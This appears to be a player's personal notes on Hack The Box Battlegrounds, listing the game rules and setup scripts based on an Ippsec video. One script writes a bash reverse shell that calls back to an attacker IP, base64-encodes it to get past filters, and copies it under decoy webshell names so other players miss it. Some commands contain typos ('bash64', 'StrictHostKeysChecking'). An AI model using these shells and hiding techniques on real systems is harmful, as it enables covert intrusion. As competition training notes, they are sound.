# Battlegrounds 

**"If you know the enemy and know yourself, you need not fear the results of a hundred battles. If you know yourself but not the enemy, for every victory gained you will also suffer defeat."* - Sun Tzu, Art of War.

Try to, at some point I want to master hacking in a battlegrounds context. This hope is that this will morph into an instructional Art of War for Hacking. From absolute novice to master.

## Rules

- Players aren’t supposed to shut down machines.
- Players are not allowed to change the root password of machines.
- Processes/commands that are marked with `HTB=1` prefix should not be considered as part of the exploitation process since they are system checks to ensure that machine’s legitimate functionality is preserved.
- Defenders are not allowed to massively “kill shells” in order to secure their systems. They should focus on patching the actual vulnerabilities.
- Defenders aren’t supposed to kill a service just to patch vulnerabilities.
- When defenders try to patch vulnerabilities, it’s their responsibility to make sure that no underlying functionality has been stopped due to their patch. For example, there is a reason for sudo entries so when they are modified they should still serve their original purpose. Removing a sudo entry is not a “fix” and defenders should consider fixing the insecure “sudo entry” instead of removing it.
- If a system check has been fired in the middle of a service restart or machine reset/reboot there is a chance that defenders will be punished with loss of points. This is intended and the reason behind that is to “award” the players who didn’t restart/reboot many times.
- Surrenders can’t be called before the 15 minute mark.

## Ippsec Scripting

[Hack The Box Hacking Battlegrounds - Cyber Mayhem Gameplay with Ippsec](https://www.youtube.com/watch?v=o42dgCOBkRk)

This section is notation and inpsired by Ippsec's "{"workflow"}" from around Oct 2020. Methods change and this document should also reflect that knowledge is power. Knowing your enemy and what they know is power. Defense and Attack are both in a context of conflict are the same thing - action to end conflict.

Requirements:
1. Tmux or equivalent and setup to manage connections, information and tools.
Although not stated by Ippsec a tmux scripting to setup a terminal multiplexer of 
```bash
#!/bin/bash

tmux new -s Battleground 
tmux new-window -t SERVER
tmux new-window -t HOME
tmux new-window -t BLUE
tmux new-window -t MSF
tmux new-window -t ATK

tmux send-keys -t HOME 'cp bg/ /tmp; cd tmp/bg' #setup 
tmux send-keys -t HOME './startBGs.sh'
tmux send-keys -t MSF 'msf'
```

2. StartBG.sh 
```bash
#!/bin/bash

cp -r www-skel/ www/
# Change $IP to another
sed -i "s/$IP/$1/g" www/*
# Copy decoy variants names of webshells
cp www/$reverseshell www/$decoy-name
cp www/$reverseshell www/$decoy-name 
echo "bash -c 'bash -i >& /dev/tcp/$1/$port 0>&1'" >> www/shell.sh
SHELL=$(cat www/shell.sh | base64 -w 0)
echo "echo -n '$SHELL' | bash64 -d | bash" >> www/shell.b64.sh
```
IP variable in the third line must be changed to match a default script variable.
The b64 version is to bypass badchars and filtering.  
Decoy naming: the variable in this script is such that the naming of the shell in the file directory it is run from or process directory `/proc/$int` as process. The file names below were given as examples of ways to avoid detection from other players. Each player has some idea of what is regularly in the www directory so a wordpress file would seem ordinary were as long string of 'a's could clutter the process tree or overflow to the textual display obfuscating another players `ps -aux` command.
```bash
decoy-name=#of the following
wp-load.php
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaah-RCE.php.gif
```

3. accesscastle.sh $IP $PASSWORD
```bash
#!/bin/bash
# Ippsec castle access script from Hack the Box Hacking Battlegrounds video
# If you dont have the -o managing ssh will be hell 
sshpass -p $2 ssh -o GlobalKnownHostsFile=/dev/null -o UserKnownHostsFile=/dev/null -o StrictHostKeysChecking=no root@$1
```

4. getflags.sh 
This script will access the castles access the hostkeys and print out the flags. It will ask for a password if the hostkey is NOT there.
```bash
#!/bin/bash
for i in $(seq 105 108); do
        echo "10.10.110.$i"
        ssh -o "BatchMode=Yes" -o "StrictHostKeyChecking=no" \
                -o "GlobalKnownHostsFile=/dev/null" -o "UserKnownHostsFile=/dev/null" \
                -i $privatekey \ # private key directory
                root@10.10.110.$i "cat /root/flag.txt; echo; cat /opt/flag.txt; echo" 2>/dev/null
        done
```

5. Metasploit is efficient. Hacking without makes you better; Metasploit streamline exploit execution chain. Speed and time are important and without metasploit research and script fixing takes time.  Shell stablisation is plain for defenders to see, with metasploit shell there is no need to stablise.

6. Create more panes for Tmux 

8. Configure Burp proxy(if using firefox to Hack from) `Proxy -> Options -> Intercept Client Request -> Add -> Match Relationship = IP address; Match condition 10.10.110.100-120` and disabling Websockets Messages on the same Proxy tab, Options `Intercept WebSockets Messages -> untick Intercept client-to-server messages & untick Intercept server-to-client messages`. This stop the background page slowing down request cycling stopping you from intercepting Battleground relevant pages.

## On Castle Enumeration

```bash
ps -aef --forest
```

## References

[Hack The Box Hacking Battlegrounds - Cyber Mayhem Gameplay with Ippsec](https://www.youtube.com/watch?v=o42dgCOBkRk)
[Tmux Scripting](https://tao-of-tmux.readthedocs.io/en/latest/manuscript/10-scripting.html)



